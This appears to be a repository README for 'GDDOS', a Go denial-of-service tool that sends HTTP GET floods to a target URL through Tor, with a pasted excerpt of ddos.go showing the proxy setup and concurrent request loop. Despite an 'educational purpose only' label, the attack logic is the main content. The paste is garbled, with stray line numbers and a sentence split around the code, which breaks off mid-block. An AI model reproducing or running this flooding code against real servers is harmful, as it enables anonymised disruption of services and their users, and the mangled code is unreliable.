# GDDOS
Denial Of Service attack in GO using TOR 

* EDUCATIONAL PURPOSE ONLY


 * CODE DESCRIPTION
  
     * ddos.go  
     
          --Its  the  modification Konstantin8105/DDoS attack  using tor
          
     * simpleddos.go  
     
          --Minimal code of line ddos attack not banging into a server at once
          
     * simpletorddos.go 
     
          --Minimal code using tor connection
          
          
     * testtor.go 
     
          --Simple script to check the tor connectivity
          
          *********************************************************************************************

* ddos.go  explanation 

             Concurrency is not  parall #func (d *DDoS) Run() {
31
        #torcon, _ := url.Parse("socks5://127.0.0.1:9050")
32
        #pather, _ := proxy.FromURL(torcon, proxy.Direct)
33
        #nwpath := &http.Transport{Dial: pather.Dial}
34
        #client := &http.Client{Transport: nwpath}
35
​
36
        #for i := 0; i < d.amountWorkers; i++ {
37
                #go func() {
38
                        #for {
39
                                select {
40
                                case <-(*d.stop):
41
                                        return
42
                                default:
43
                                        // sent http GET requests
44
                                        resp, err := client.Get(d.url)
45
                                        atomic.AddInt64(&d.amountRequests, 1)
46
                                        if err == nil {
47
                                                atomic.AddInt64(&d.successRequest, 1)
48
                                                _, _ = io.Copy(ioutil.Discard, resp.Body)
49
                                                _ = resp.Body.Close()
50
                                                fmt.Println(d)
51
                                        }esism a



